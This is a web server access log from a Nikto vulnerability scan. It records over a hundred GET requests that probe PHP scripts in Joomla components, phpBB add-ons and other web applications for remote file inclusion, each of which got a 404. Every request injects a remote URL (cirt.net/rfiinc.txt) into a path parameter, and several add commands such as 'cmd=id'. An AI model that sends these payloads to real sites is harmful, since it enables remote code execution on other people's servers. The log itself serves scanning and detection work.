172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 556 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004159)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 551 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004160)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_color/admin.color.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004161)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_color/admin.color.php?mosConfig_live_site=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004162)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 562 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004163)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 571 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004164)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 563 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004165)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 550 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004166)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 550 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004167)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_dadamail/config.dadamail.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004168)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_dbquery/classes/DBQ/admin/common.class.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 562 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004169)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_events/admin.events.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004170)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_extcalendar/admin_settings.php?CONFIG_EXT[ADMIN_PATH]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 550 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004171)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_extended_registration/admin.extended_registration.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 573 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004172)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 557 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004173)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 558 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004174)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 561 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004175)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 553 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004176)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 551 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004177)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 540 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004178)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004179)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 540 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004180)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004181)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004182)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 552 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004183)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_jcs/views/reports.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 546 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004184)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004185)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004186)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004187)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 575 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004188)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 577 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004189)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 557 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004190)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 552 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004191)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_jreactions/langset.php?comPath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 542 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004192)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004193)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 550 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004194)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 563 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004195)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004196)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 554 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004197)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 551 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004198)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004199)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 552 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004200)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 555 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004201)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 554 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004202)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 556 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004203)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_nfn_addressbook/nfnaddressbook.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 554 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004204)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 558 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004205)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004206)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 552 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004207)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 550 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004208)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004209)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 552 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004210)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 566 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004211)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_tour_toto/admin.tour_toto.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004212)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 540 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004213)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_webring/admin.webring.docs.php?component_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004214)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 550 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004215)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 554 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004216)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/components/com_wmtrssreader/admin.wmtrssreader.php?mosConfig_live_site=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004217)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/menu_add.php?site_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004218)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /administrator/menu_operation.php?site_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004219)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /adminpanel/includes/add_forms/addmp3.php?GLOBALS[root_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004220)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /adminpanel/includes/mailinglist/mlist_xls.php?GLOBALS[root_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004221)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /adodb/adodb-errorpear.inc.php?ourlinux_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004222)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /adodb/adodb-pear.inc.php?ourlinux_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004223)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /adodb/adodb.inc.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004224)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /advanced_comment_system/admin.php?ACS_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004225)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /advanced_comment_system/index.php?ACS_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004226)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /afb-3-beta-2007-08-28/_includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004227)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /afb-3-beta-2007-08-28/_includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004228)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /agenda.php3?rootagenda=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004229)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /agenda2.php3?rootagenda=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004230)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /aides/index.php?page=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004231)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /ains_main.php?ains_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004232)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /ajax/loadsplash.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004233)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /ajouter.php?include=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004234)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /akarru.gui/main_content.php?bm_content=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004235)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /akocomments.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004236)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /amazon/cart.php?cmd=add&asin=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004237)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /amazon/index.php?lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004238)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /amazon/info.php?asin=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004239)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /annonce.php?page=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004240)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /announcements.php?phpraid_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004241)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /anzagien.php?config[root_ordner]=http://cirt.net/rfiinc.txt??cmd=id HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004242)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /apbn/templates/head.php?APB_SETTINGS[template_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004243)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /api.php?t_path_core=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004244)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /apps/apps.php?app=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004245)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /appserv/main.php?appserv_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004246)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /arab3upload/customize.php?path=http://cirt.net/rfiinc.txt??&cmd=pwd HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004247)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /arab3upload/initialize.php?path=http://cirt.net/rfiinc.txt??&cmd=pwd HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004248)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /arash_lib/class/arash_gadmin.class.php?arashlib_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004249)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /arash_lib/class/arash_sadmin.class.php?arashlib_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004250)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /arash_lib/include/edit.inc.php?arashlib_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004251)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /arash_lib/include/list_features.inc.php?arashlib_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004252)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /archive.php?scriptpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004253)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /aroundme/template/barnraiser_01/pol_view.tpl.php?poll=1&templatePath=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004254)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /artlist.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004255)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=http://cirt.net/rfiinc.txt??cmd HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004256)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /assets/snippets/reflect/snippet.reflect.php?reflect_base=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004257)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /athena.php?athena_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004258)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /auction/auction_common.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004259)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /auction/includes/converter.inc.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004260)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /auction/includes/messages.inc.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004261)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /auction/includes/settings.inc.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004262)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /auction/phpAdsNew/view.inc.php?phpAds_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004263)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /auth.cookie.inc.php?da_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004264)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /auth.header.inc.php?da_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004265)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /auth.sessions.inc.php?da_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004266)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /auth/auth.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004267)"
